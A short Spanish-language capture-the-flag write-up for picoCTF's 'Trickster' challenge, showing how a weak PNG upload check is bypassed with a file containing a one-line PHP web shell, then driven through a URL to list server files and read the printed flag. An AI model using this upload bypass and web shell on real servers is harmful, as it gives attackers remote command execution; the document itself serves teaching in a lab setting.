# Reto: Trickster

## Descripción

I found a web app that can help process images: PNG images only!

## Solución

La página nos dice que recibe imágenes png. Checando `robots.txt` podemos ver que hay un archivo `instructions.txt` y una carpeta `/uploads/` donde seguramente se guardan las imágenes.

`instructions.txt` nos indica que la validez del archivo png es verificada de dos formas:
- Buscando ".png" en el archivo, sólo que lo contenga, no que esté al final.
- Checar los _magic bytes_. Esto es básicamente una firma que tienen los archivos png al inicio con el mismo texto 'png'.

Con esta información podemos crear un archivo que cumpla estas condiciones.
Este se llama `definitely-an-image.png.php`, con los siguientes contenidos:
```php
PNG
<?php system($_GET['cmd']); ?>
```

Después, con la liga:

http://atlas.picoctf.net:51621/uploads/definitely-an-image.png.php?cmd=ls ..

Se podían ver los contenidos de la carpeta de la web, donde había un archivo con un nombre aleatorio. El contenido de este archivo era la bandera.

`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}`

## Notas

El archivo png llama a la función `system()` que recibe como argumento el comando que se quiere ejecutar. `$_GET['cmd']` recoge el contenido del parámetro 'cmd' de la url.
